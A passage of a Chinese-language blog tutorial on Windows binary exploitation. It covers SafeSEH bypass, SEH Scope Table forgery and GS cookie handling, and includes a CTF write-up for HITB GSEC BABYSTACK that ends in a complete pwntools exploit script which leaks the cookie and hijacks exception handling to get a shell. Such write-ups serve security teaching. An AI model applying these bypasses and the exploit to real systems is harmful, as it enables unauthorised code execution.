TRUE;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>首先该函数判断异常处理函数地址是不是在加载模块的内存空间，如果属于加载模块的内存空间，检验函数将一次进行如下判断：<ul>
+<li>判断程序设置 <code>IMAGE_DLLCHARACTERISTIC_NO_SEH</code>标识，设置了就忽略异常，函数返回校验失败.</li>
+<li>检测程序是否包含 <code>SEH</code>表，如果包含，则将当前异常处理函数地址与该表进行匹配，匹配成功返回校验成功，否则失败.</li>
+<li>判断程序是否设置 <code>ILonly</code>标识，设置了标识程序只包含 <code>.NET</code>编译人中间语言，函数直接返回校验失败。</li>
+<li>判断异常处理函数是否位于不可执行页(<code>non-executable page</code>)上，若位于校验函数将检测 <code>DEP</code>是否开启，如若系统未开启<code>DEP</code>则返回校验成功，否则程序抛出访问违例的异常。</li>
+</ul>
+</li>
+<li>如果异常处理函数的地址没有包含在加载模块的内存空间，检验函数将直接执行DEP相关检测，函数将依次进行如下检验：<ul>
+<li>判断异常处理函数是否位于不可执行页(<code>non-executable page</code>)上，若位于校验函数将检测 <code>DEP</code>是否开启，如若系统未开启<code>DEP</code>则返回校验成功，否则程序抛出访问违例的异常。</li>
+<li>判断系统是否允许跳转到加载模块的内存空间外执行，如允许则返回校验成功，否则返回校验失败。</li>
+</ul>
+</li>
+</ul>
+<p><strong>需要注意的一点是</strong>，win10及以上操作系统会调用<code>ntdll!RtlpIsValidExceptionChain</code> 检测<code>SEH</code> 链的合法性，也即覆盖后的 <code>Next</code>需要指向一个正常的 <code>SEH</code>，保证 <code>SEH</code>链的正常。</p>
+<p><strong>绕过SafeSEH</strong></p>
+<p>分析三种情况可行性：</p>
+<ol>
+<li>只考虑<code>SafeSEH</code>，不考虑 <code>DEP</code>干扰，需要在加载模块内存范围之外找到一个跳板指令就可以转入 <code>shellcode</code>中执行；</li>
+<li>可以利用未启用的<code>SafeSEH</code>模块中的指令作为跳板，转入<code>shellcode</code>执行；</li>
+<li>可以考虑：a. 清空安全SEH表，造成该模块未启用<code>SafeSEH</code>假象；b. 将指令注册到安全<code>SEH</code>表中。</li>
+</ol>
+<p>其他的方法：</p>
+<ol>
+<li>不攻击SEH，使用覆盖返回地址或者虚函数表等信息；</li>
+<li>利用SEH的安全校验的严重缺陷，如果<code>SEH</code>中的异常函数指针指向<strong>堆区</strong>，即使安全校验发现<code>SEH</code>不可信，仍会调用其已修改过的异常处理函数。（这种方法目前在windows10上不可行，因为windows加入了一个新的检查 <strong>MEM_EXECUTE_OPTION_IMAGE_DISPATCH_ENABLE</strong>，决定了是否允许在加载模块内存空间外执行）。</li>
+</ol>
+<p>利用方法：</p>
+<ol>
+<li>覆盖 <code>NEXT</code>指针和 <code>SE handler</code> 。</li>
+<li>使用未开启 <code>Safe SEH</code>模块的 <code>gadgets</code>绕过 <code>SafeSEH</code>。例如：HITB GSEC Babyshellcode</li>
+<li>覆盖 <code>SEH handler</code>使得程序执行这段 <code>gadget</code>，最终跳转到 <code>shellcode</code>。例如：2024 西湖论剑 babywin</li>
+</ol>
+<p>覆盖 <code>SE handler</code>指向一段 <code>POP POP ret</code>的 <code>gadgets</code>，当发生程序错误，调用 <code>SEH</code>会让程序跳转到 <code>POP POP ret</code>指令的位置，当执行到 <code>ret</code>的时候，会发现此时 <code>ESP</code>正好指向 <code>JMP SHORT 0x6</code>，程序执行这个代码，使得 <code>EIP</code>向后调转 <code>0x6</code>个字节，跳入在缓冲区后方的 <code>shellcode</code>，成功执行代码。</p>
+<p>这里为什么 执行完 <code>SE handler</code>还能跳转到 <code>JMP SHORT 0x6</code>之前执行呢？原因<strong>在于当异常发生时，异常分发器创建自己的栈帧，会把 <code>EH Handler</code>成员压入新创建的栈帧中（作为函数起始的一部分），在 <code>EH</code>结构中有一个域是 <code>EstablisherFrame</code>，这个域指向异常注册记录(next seh)的地址并被压入栈中，当一个例程被调用的时候被压入的这个值都是位于 <code>ESP+8</code>的地方。</strong></p>
+<p>如果用 <code>pop pop ret</code>的地址覆盖 <code>SEH Handler</code>，第一个 <code>pop</code>将弹出栈顶的 4字节，接下来 <code>pop</code>继续从栈中弹出 4 字节，最后的 <code>ret</code>将把此时 <code>esp</code>所指向栈顶中的值 <code>next SEH</code>的地址放到 <code>EIP</code>中。</p>
+<h4 id="SEH-Scope-Table"><a href="#SEH-Scope-Table" class="headerlink" title="SEH Scope Table"></a>SEH Scope Table</h4><p>系统通过 <code>ScopeTable</code>结构体来实现 <code>__except</code> 和 <code>__finally</code>函数。其中 <code>_EH4_SCOPETABLE_RECORD</code>结构体中的 <code>HandlerAddress</code>对应 <code>__except</code>函数，<code>FinallyFunc</code>对应 <code>__finally</code>函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">EH4_SCOPETABLE</span> &#123;</span><br>        DWORD GSCookieOffset;<br>        DWORD GSCookieXOROffset;<br>        DWORD EHCookieOffset;<br>        DWORD EHCookieXOROffset;<br>        _EH4_SCOPETABLE_RECORD ScopeRecord[<span class="hljs-number">1</span>];<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">EH4_SCOPETABLE_RECORD</span> &#123;</span><br>        DWORD EnclosingLevel;<br>        <span class="hljs-type">long</span> (*FilterFunc)();<br>        <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>            <span class="hljs-type">void</span> (*HandlerAddress)();	<span class="hljs-comment">// __except</span><br>            <span class="hljs-type">void</span> (*FinallyFunc)(); 		<span class="hljs-comment">// __finally</span><br>    &#125;;<br>&#125;;<br></code></pre></td></tr></table></figure>
+
+<p>一般而言，对于显式使用<code>try-except</code>或者 <code>try-finally</code> 的程序，函数栈帧如下所示：</p>
+<p><img src="/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240205234527868.png" srcset="/img/loading.gif" lazyload alt="image-20240205234527868"></p>
+<p><strong>Scope Table</strong></p>
+<p><img src="/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240205235331338.png" srcset="/img/loading.gif" lazyload alt="image-20240205235331338"></p>
+<p><code>__except_handler4</code> 是系统默认异常处理回调函数。当发生异常时，程序经过SafeSEH流程后，<code>ntdll!ExecuteHandler2</code> 函数会首先执行<code>__except_handler4</code> 处理异常。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">SEH_4010B0</span><span class="hljs-params">(<span class="hljs-type">int</span> a1, <span class="hljs-type">int</span> a2, <span class="hljs-type">int</span> a3, <span class="hljs-type">int</span> a4)</span><br>&#123;<br>  <span class="hljs-keyword">return</span> except_handler4_common(&amp;__security_cookie, sub_401490, a1, a2, a3, a4);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这个函数嵌套调用了 <code>except_handler4_common</code>函数，该函数首先会检查栈上的 <code>GS</code>值，然后根据 <code>securityCookies</code>解密 <code>_EH4_SCOPETABLE</code>的地址，最终会调用到 <code>_EH4_SCOPETABLE</code>里面的 <code>FilterFunc</code>与 <code>FinallyFunc</code>函数，也就是我们自定义的 <code>__except</code>或 <code>__finally</code>函数的地址。如果能够伪造一个 <code>_EH4_SCOPETABLE</code>结构，里面的<code>FilterFunc</code>函数指针写成自己的，其他字段不改变，覆盖栈中的 <code>_EH4_SCOPETABLE_addr</code>为伪造地址，就能实现任意地址函数调用。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __cdecl <span class="hljs-title function_">ValidateLocalCookies</span><span class="hljs-params">(<span class="hljs-type">void</span> (__fastcall *cookieCheckFunction)(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>), _EH4_SCOPETABLE *scopeTable, <span class="hljs-type">char</span> *framePointer)</span><br>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v3; <span class="hljs-comment">// esi@2</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v4; <span class="hljs-comment">// esi@3</span><br><br>    <span class="hljs-keyword">if</span> ( scopeTable-&gt;GSCookieOffset != <span class="hljs-number">-2</span> )<br>    &#123;<br>        <span class="hljs-comment">//获取GS_Cookie</span><br>        v3 = *(_DWORD *)&amp;framePointer[scopeTable-&gt;GSCookieOffset] ^ (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)&amp;framePointer[scopeTable-&gt;GSCookieXOROffset];<br>        __guard_check_icall_fptr(cookieCheckFunction);<br>        <span class="hljs-comment">//检查GS_Cookie是否一致</span><br>        ((<span class="hljs-type">void</span> (__thiscall *)(_DWORD))cookieCheckFunction)(v3);<br>    &#125;<br>    v4 = *(_DWORD *)&amp;framePointer[scopeTable-&gt;EHCookieOffset] ^ (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)&amp;framePointer[scopeTable-&gt;EHCookieXOROffset];<br>    __guard_check_icall_fptr(cookieCheckFunction);<br>    ((<span class="hljs-type">void</span> (__thiscall *)(_DWORD))cookieCheckFunction)(v4);<br>&#125;<br><br><span class="hljs-type">int</span> __cdecl _except_handler4_common(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *securityCookies, <span class="hljs-type">void</span> (__fastcall *cookieCheckFunction)(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>), _EXCEPTION_RECORD *exceptionRecord, <span class="hljs-type">unsigned</span> __int32 sehFrame, _CONTEXT *context)<br>&#123;<br>    <span class="hljs-comment">// 异或解密 scope table</span><br>    scopeTable_1 = (_EH4_SCOPETABLE *)(*securityCookies ^ *(_DWORD *)(sehFrame + <span class="hljs-number">8</span>));<br><br>    <span class="hljs-comment">// sehFrame 等于 主函数 ebp - 10h 位置, framePointer 等于主函数 ebp 的位置</span><br>    framePointer = (<span class="hljs-type">char</span> *)(sehFrame + <span class="hljs-number">16</span>);<br>    scopeTable = scopeTable_1;<br><br>    <span class="hljs-comment">// 验证 GS</span><br>    ValidateLocalCookies(cookieCheckFunction, scopeTable_1, (<span class="hljs-type">char</span> *)(sehFrame + <span class="hljs-number">16</span>));<br>    __except_validate_context_record(context);<br><br>    <span class="hljs-keyword">if</span> ( exceptionRecord-&gt;ExceptionFlags &amp; <span class="hljs-number">0x66</span> )<br>    &#123;<br>        ......<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        exceptionPointers.ExceptionRecord = exceptionRecord;<br>        exceptionPointers.ContextRecord = context;<br>        tryLevel = *(_DWORD *)(sehFrame + <span class="hljs-number">12</span>);<br>        *(_DWORD *)(sehFrame - <span class="hljs-number">4</span>) = &amp;exceptionPointers;<br>        <span class="hljs-keyword">if</span> ( tryLevel != <span class="hljs-number">-2</span> )<br>        &#123;<br>            <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>            &#123;<br>                v8 = tryLevel + <span class="hljs-number">2</span> * (tryLevel + <span class="hljs-number">2</span>);<br>                filterFunc = (<span class="hljs-type">int</span> (__fastcall *)(_DWORD, _DWORD))*(&amp;scopeTable_1-&gt;GSCookieXOROffset + v8);<br>                scopeTableRecord = (_EH4_SCOPETABLE_RECORD *)((<span class="hljs-type">char</span> *)scopeTable_1 + <span class="hljs-number">4</span> * v8);<br>                encloseingLevel = scopeTableRecord-&gt;EnclosingLevel;<br>                scopeTableRecord_1 = scopeTableRecord;<br>                <span class="hljs-keyword">if</span> ( filterFunc )<br>                &#123;<br>                    <span class="hljs-comment">// 调用 FilterFunc</span><br>                    filterFuncRet = _EH4_CallFilterFunc(filterFunc);<br>                    ......<br>                    <span class="hljs-keyword">if</span> ( filterFuncRet &gt; <span class="hljs-number">0</span> )<br>                    &#123;<br>                        ......<br>                        <span class="hljs-comment">// 调用 FilterFunc</span><br>                        _EH4_TransferToHandler(scopeTableRecord_1-&gt;HandlerFunc, v5 + <span class="hljs-number">16</span>);<br>                        ......<br>                    &#125;<br>                &#125;<br>                ......<br>                tryLevel = encloseingLevel;<br>                <span class="hljs-keyword">if</span> ( encloseingLevel == <span class="hljs-number">-2</span> )<br>                    <span class="hljs-keyword">break</span>;<br>                scopeTable_1 = scopeTable;<br>            &#125;<br>            ......<br>        &#125;<br>    &#125;<br>  ......<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>最终函数栈帧如下：</p>
+<p><img src="/img/windows-pwn%E5%85%A5%E9%97%A8/14931297820310.jpg" srcset="/img/loading.gif" lazyload alt="14931297820310"></p>
+<h3 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h3><p><code>Windows</code>下利用栈溢出执行<code>rop</code>来 <code>getshell</code>。</p>
+<h4 id="GS-Cookie"><a href="#GS-Cookie" class="headerlink" title="GS_Cookie"></a>GS_Cookie</h4><p>在<code>windows</code>结束 <code>ret</code>之前，会进行一个检查 <code>__security_check_cookie</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text:0000000140001000 ; __unwind &#123; // __GSHandlerCheck<br>.text:0000000140001000                 push    rbx<br>.text:0000000140001002                 sub     rsp, 130h<br>.text:0000000140001009                 mov     rax, cs:__security_cookie<br>.text:0000000140001010                 xor     rax, rsp<br>.text:0000000140001013                 mov     [rsp+138h+var_18], rax<br>	<br>    									...<br>    <br>.text:00000001400010B2                 mov     rcx, [rsp+138h+var_18]<br>.text:00000001400010BA                 xor     rcx, rsp        ; StackCookie<br>.text:00000001400010BD                 call    __security_check_cookie<br>.text:00000001400010C2                 add     rsp, 130h<br>.text:00000001400010C9                 pop     rbx<br>.text:00000001400010CA                 retn<br></code></pre></td></tr></table></figure>
+
+<p>可以看到程序首先会使用全局变量 <code>__security_cookie</code>与 <code>rsp</code>进行异或，生成一个 <code>StackCookie</code>放到 <code>rbp+0x18</code>的位置。在执行 <code>ret</code>之前，会将 <code>Stack_Cookie</code>与 <code>rsp</code>进行异或，然后调用 <code>__security_check_cookie</code>检查是否结果是否等于 <code>__security_cookie</code>。</p>
+<p><code>__security_cookie</code>这个全局变量，是存储在程序的 <code>data</code>段上：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.data:0000000140003008 __security_cookie dq 2B992DDFA232h      ; DATA XREF: main+9↑r<br></code></pre></td></tr></table></figure>
+
+<p>所以，利用栈溢出时，要么能泄露 <code>StackCookie</code>，溢出时对齐进行修复；要么能泄露 <code>__security_cookie</code>和 <code>rsp</code>，对其进行修复。</p>
+<h4 id="库函数调用"><a href="#库函数调用" class="headerlink" title="库函数调用"></a>库函数调用</h4><p><code>Linux</code>执行 <code>rop</code>，有两个关键点合适的 <code>gadget</code>和准确的 库函数地址，这两点在 <code>Linux</code>下都可以通过 <code>glibc</code>来泄露寻找。但是对于 <code>windows</code>则需要分开寻找。</p>
+<p><code>ntdll.dll</code>是<code>Windows</code>系统从<code>ring3</code>到<code>ring0</code>的入口。位于<code>Kernel32.dll</code>和<code>user32.dll</code>中的所有<code>win32 API</code> 最终都是调用<code>ntdll.dll</code>中的函数实现的。<code>ntdll.dll</code>中的函数使用<code>SYSENTRY</code>进入<code>ring0</code>，函数的实现实体在<code>ring0</code>中。所以如果这个函数是每个程序启动基本都会调用的，可以考虑从中寻找我们需要的 <code>gadget</code>。</p>
+<p>然后是寻找库函数地址， <code>ucrtbased.dll</code>这个库是 <code>VC</code>程序执行必须要有的库，里面放入了很多 <code>VC</code>程序的<code>API</code>调用接口，类似于 <code>Glibc.so</code>。所以可以考虑从 <code>ucrtbased.dll</code>寻找需要调用的 函数地址。</p>
+<p>但是，<code>windows</code>的传参方式和函数调用都与 <code>Linux</code>有一些差别。</p>
+<p><code>Windows</code>64位下 参数也通过寄存器传递，依次通过 <code>rcx\ rdx\ r8\ r9</code>。其次函数调用 也不能直接指向 函数实现的入口地址，又因为 <code>windows</code>下没有 <code>plt</code>表，所以调用程序内的函数，要指向 <code>call func</code>的地址，例如要调用 <code>puts</code>函数，需要使用如下 <code>gadget</code>：</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">.tex<span class="hljs-variable">t:00000001400010A6</span>                 <span class="hljs-keyword">call</span>    <span class="hljs-keyword">c</span><span class="hljs-variable">s:puts</span><br></code></pre></td></tr></table></figure>
+
+<p>所以，我们想要实现库函数调用，也不可以直接指向库函数地址，而是要找到此类地址：</p>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000000</span>ABBA0                 <span class="hljs-keyword">jmp</span>     common_system_char_<br></code></pre></td></tr></table></figure>
+
+<p>所以可能需要泄露 <code>ntdll.dll</code>和 <code>ucrtbased.dll</code>的基址。</p>
+<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="HITB-GSEC-BABYSTACK"><a href="#HITB-GSEC-BABYSTACK" class="headerlink" title="HITB GSEC BABYSTACK"></a>HITB GSEC BABYSTACK</h3><p>类似于pwn题的一般步骤。</p>
+<p>查看保护，发现保护几乎全开。</p>
+<p><img src="/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240205222612190.png" srcset="/img/loading.gif" lazyload alt="image-20240205222612190"></p>
+<p>可以看到，程序开启了ASLR，为了方便调试，这里我们关闭程序的ASLR。关闭方式也比较简单，改变PE文件Optional Header的DllCharacteristics属性，将<strong>DLL can move</strong> 关掉，然后另存为即可。</p>
+<p><img src="/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240205223304423.png" srcset="/img/loading.gif" lazyload alt="image-20240205223304423"></p>
+<p>使用IDA逆向分析。</p>
+<p><img src="/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240205223514074.png" srcset="/img/loading.gif" lazyload alt="image-20240205223514074"></p>
+<p>程序流程也比较简单，一开始便泄露了stack地址与main函数地址，然后有10次机会来任意地址读或者栈溢出。遗憾的是，程序使用<code>exit</code> 退出，使得ROP的方式几乎不可行。查看main函数汇编，也可以看到提供的后门地址。这里可以考虑利用<strong>SEH</strong>，这也是windows pwn的常见利用方式。</p>
+<p><img src="/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240205231256675.png" srcset="/img/loading.gif" lazyload alt="image-20240205231256675"></p>
+<p>那么这里该如何利用呢？</p>
+<p>首先，考虑跳转到shellcode的方法。</p>
+<p>这里由于开启了DEP，无法在栈上执行shellcode，从而不可行。</p>
+<p>其次，考虑未开启SafeSEH模块的利用。</p>
+<p>这里使用OD的SafeSEH插件查看其他模块是否开启了SageSEH。</p>
+<p><img src="/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240205232137909.png" srcset="/img/loading.gif" lazyload alt="image-20240205232137909"></p>
+<p>很遗憾，这种方式不可行。</p>
+<p>最后，考虑利用SEH Scope Table。</p>
+<p>SEH Scope Table需要伪造fake ScopeTable，同时还需要伪造其他结构，但是我们有10次机会任意地址泄露，所以这种方式可以尝试。</p>
+<p><code>main</code> 函数的栈帧与Scope Table结构如下：</p>
+<p><img src="/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240205234527868.png" srcset="/img/loading.gif" lazyload alt="image-20240205234527868"></p>
+<p><img src="/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240205235331338.png" srcset="/img/loading.gif" lazyload alt="image-20240205235331338"></p>
+<p>利用方法如下：</p>
+<ol>
+<li><p>利用任意地址泄露，泄露<code>Next_SEH_Frame</code>、<code>SEH_Handler</code>、<code>___security_cookie</code>、<code>GS_Cookie</code>.</p>
+</li>
+<li><p>伪造fake_scopetable</p>
+</li>
+</ol>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">fake_scope_table = flat(<br>    &#123;<br>        <span class="hljs-number">0</span>: [<br>            <span class="hljs-number">0xffffffe4</span>,     # GSCookieOffset<br>            <span class="hljs-number">0</span>,              # GSCookieOROffset<br>            <span class="hljs-number">0xffffff20</span>,     # EHCookieOffset<br>            <span class="hljs-number">0</span>,              # EHCookieOROffset<br>            # ScopeRecord[<span class="hljs-number">1</span>]<br>            <span class="hljs-number">0xfffffffe</span>,     # EnclosingLevel<br>            backdoor,       # FilterFunc<br>            backdoor        # HandlerAddress<br>        ]<br>    &#125;<br>)<br></code></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>恢复栈帧，获取shell。</li>
+</ol>
+<p>调试过程如下：</p>
+<p><img src="/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240205233248315.png" srcset="/img/loading.gif" lazyload alt="image-20240205233248315"></p>
+<p><img src="/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240205233307698.png" srcset="/img/loading.gif" lazyload alt="image-20240205233307698"></p>
+<p>最终wp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> warnings<br><br>warnings.filterwarnings(<span class="hljs-string">&quot;ignore&quot;</span>, category=BytesWarning)<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>p = remote(<span class="hljs-string">&#x27;192.168.0.190&#x27;</span>, <span class="hljs-number">1234</span>)<br><br>lg = <span class="hljs-keyword">lambda</span> x, y: log.success(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;x&#125;</span>: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(y)&#125;</span>&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read_value</span>(<span class="hljs-params">address</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;know more?\r\n&quot;</span>, <span class="hljs-string">&quot;yes&quot;</span>)<br>    p.sendlineafter(<span class="hljs-string">&quot;want to know\r\n&quot;</span>, <span class="hljs-built_in">str</span>(address))<br>    p.recvuntil(<span class="hljs-string">&quot;value is 0x&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(p.recvline().strip(<span class="hljs-string">b&quot;\r\n&quot;</span>), <span class="hljs-number">16</span>)<br><br><br>pause()<br><br>security_cookie_offset = <span class="hljs-number">0x404004</span> - <span class="hljs-number">0x4010b0</span><br>backdoor_offset = <span class="hljs-number">0x40138D</span> - <span class="hljs-number">0x4010b0</span><br><br>p.recvuntil(<span class="hljs-string">&#x27;stack address = 0x&#x27;</span>)<br>stack = <span class="hljs-built_in">int</span>(p.recvline()[:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)<br>lg(<span class="hljs-string">&#x27;stack&#x27;</span>, stack)<br><br>p.recvuntil(<span class="hljs-string">&#x27;ain address = 0x&#x27;</span>)<br>main = <span class="hljs-built_in">int</span>(p.recvline()[:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)<br>lg(<span class="hljs-string">&#x27;main&#x27;</span>, main)<br><br>backdoor = main + backdoor_offset<br>_except_handler_address = main + <span class="hljs-number">0x00401460</span> - <span class="hljs-number">0x004010B0</span><br><br>security_cookie = read_value(main + security_cookie_offset)<br>lg(<span class="hljs-string">&#x27;security_cookie&#x27;</span>, security_cookie)<br><br>ebp = stack + <span class="hljs-number">0x9c</span><br>seh_next = read_value(ebp - <span class="hljs-number">0x10</span>)<br>lg(<span class="hljs-string">&#x27;seh_next&#x27;</span>, seh_next)<br><br>fake_scope_table = flat(<br>    &#123;<br>        <span class="hljs-number">0</span>: [<br>            <span class="hljs-number">0xffffffe4</span>,     <span class="hljs-comment"># GSCookieOffset</span><br>            <span class="hljs-number">0</span>,              <span class="hljs-comment"># GSCookieOROffset</span><br>            <span class="hljs-number">0xffffff20</span>,     <span class="hljs-comment"># EHCookieOffset</span><br>            <span class="hljs-number">0</span>,              <span class="hljs-comment"># EHCookieOROffset</span><br>            <span class="hljs-comment"># ScopeRecord[1]</span><br>            <span class="hljs-number">0xfffffffe</span>,     <span class="hljs-comment"># EnclosingLevel</span><br>            backdoor,       <span class="hljs-comment"># FilterFunc</span><br>            backdoor        <span class="hljs-comment"># HandlerAddress</span><br>        ]<br>    &#125;<br>)<br>fake_scope_table_addr = stack + <span class="hljs-number">0x4</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span><br>payload += fake_scope_table<br>payload = payload.ljust(<span class="hljs-number">0x9c</span> - <span class="hljs-number">0x1c</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>payload += p32(security_cookie ^ ebp)<br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">8</span><br>payload += p32(seh_next)<br>payload += p32(_except_handler_address)<br>payload += p32(security_cookie ^ fake_scope_table_addr)<br>payload += p32(<span class="hljs-number">0</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;know more?\r\n&quot;</span>, <span class="hljs-string">&quot;n&quot;</span>)<br>p.sendline(payload)<br><br>p.sendlineafter(<span class="hljs-string">&quot;know more?\r\n&quot;</span>, <span class="hljs-string">&quot;yes&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;want to know\r\n&quot;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">0</span>))<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
